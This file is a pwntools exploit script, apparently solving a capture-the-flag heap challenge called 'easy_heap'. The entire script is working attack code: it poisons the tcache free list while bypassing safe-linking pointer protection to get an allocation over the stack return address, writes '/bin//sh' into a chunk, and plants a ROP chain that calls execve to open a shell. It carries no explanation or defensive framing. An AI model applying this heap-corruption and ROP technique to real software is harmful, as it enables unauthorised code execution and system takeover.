from pwn import *
context.arch = 'amd64'
context.terminal = ['konsole', '-e']

proc = process("./easy_heap")

def enter_command(value):
  proc.sendlineafter("command:", str(value))

def enter_index(index):
  proc.sendlineafter("index:", str(index))

def alloc(index):
  enter_command(0)
  enter_index(index)

def free(index):
  enter_command(1)
  enter_index(index)

def edit(index, value):
  enter_command(2)
  enter_index(index)
  proc.sendlineafter("input:", value);

def get():
  enter_command(3)
  ret = []
  for i in range(3):
    proc.recvuntil("{}: ".format(i))
    ret.append(proc.recvuntil('\n'))
  return ret
def showmem(index):
  enter_command(4)
  enter_index(index)
  ret = proc.recvuntil('\n')

  return ret

def set_address(addr, index):
  alloc(0)
  alloc(1)

  adr = get()
  first = int(adr[0], 16);
  second = int(adr[1], 16);

  free(1)
  free(0)

  alloc_dest = addr ^ (first >> 12)

  payload = pack(alloc_dest)
  print(payload)

  print("[PROTECT]first {}".format(hex(first)));
  print("[PROTECT]second {}".format(hex(second)));
  print("[PROTECT]allocate {}".format(hex(alloc_dest)))

  edit(0, payload)

  alloc(0)
  alloc(index)

  assert int(get()[index], 16) == addr

  print("got memory address! {} at {}".format(hex(addr), index))

proc.recvuntil('at ')
str_address_base = proc.recvuntil('\n')
address_base = int(str_address_base, 16)

# _start_stack_adr = address_base + 0x28
# print("address base {}".format(hex(address_base)))
# print("allocating {}".format(hex(_start_stack_adr)))

# set_address(_start_stack_adr, 2)


# _start_raw_address = showmem(2)[:-1]
# if len(_start_raw_address) != 6:
#    print("attack failed")
# _start_raw_address += b'\x00' * (8 - len(_start_raw_address))
# print(_start_raw_address)
# _start_address = unpack(_start_raw_address)

# print("got _start address! {}".format(hex(_start_address)))

# _start_offset = 0x10b0
# program_base_address = _start_address - _start_offset
# print("got ASLR base address! {}".format(hex(program_base_address)))


rop_start_ret = address_base - 0x8
rop_padding_size = 0x28
set_address(rop_start_ret - rop_padding_size, 2) # rop_start_ret をそのまま渡すとmalloc_chunkの書き込みで色々書き換えられて落ちるため

second_addr = int(get()[1], 16)
print('"/bin//sh" in second. at {}'.format(hex(second_addr)))
edit(1, "/bin//sh\0")

pop_rax = 0x000000000044e707
pop_rdi = 0x00000000004017b1
pop_edx_r = 0x00000000004234ca
pop_rsi = 0x000000000040814e
syscall = 0x000000000040120e

payload = b''
payload += b'\x00' * (rop_padding_size)

payload += pack(pop_rax)
payload += pack(59)
payload += pack(pop_edx_r)
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(pop_rdi)
payload += pack(second_addr)
payload += pack(pop_rsi)
payload += pack(0)
payload += pack(syscall)

# gdb.attach(proc, "break edit")

edit(2, payload)

proc.interactive()


